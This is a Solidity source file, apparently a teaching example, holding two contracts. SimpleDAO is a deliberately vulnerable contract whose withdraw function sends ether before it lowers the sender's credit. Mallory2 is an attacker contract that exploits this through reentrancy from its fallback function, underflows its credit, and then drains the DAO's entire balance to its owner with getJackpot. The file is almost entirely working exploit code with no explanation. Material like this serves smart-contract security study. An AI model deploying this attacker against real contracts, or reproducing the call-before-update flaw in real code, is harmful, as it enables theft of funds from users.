contract SimpleDAO {
  mapping (address => uint) public credit;

  function donate(address to) {
    credit[to] += msg.value;
  }

  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
    }
  }

  function queryCredit(address to) returns (uint){
    return credit[to];
  }
}

contract Mallory2 {
  SimpleDAO public dao;
  address owner; 
  bool public performAttack = true;

  function Mallory2(SimpleDAO addr){
    owner = msg.sender;
    dao = addr;
  }
    
  function attack()  {
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }

  function getJackpot(){
    dao.withdraw(dao.balance);
    owner.send(this.balance);
    performAttack = true;
  }

  function() {
    if (performAttack) {
       performAttack = false;
       dao.withdraw(1);
    }
  }
}